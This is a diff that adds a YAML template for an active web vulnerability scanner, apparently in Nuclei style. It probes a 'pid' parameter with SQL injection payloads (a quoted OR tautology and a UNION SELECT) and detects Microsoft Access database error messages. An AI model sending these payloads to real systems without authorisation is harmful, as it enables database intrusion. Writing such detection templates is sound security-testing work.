@@ -1,0 +1,22 @@
+id: sqli6-access-05
+name: 'SQLi access probe in pid'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - access
+description: 'Triggers access error via pid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      pid:
+        - '" OR "1"="1'
+        - ''' UNION SELECT NULL,NULL--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'Microsoft JET'
+          - 'ODBC Microsoft Access'
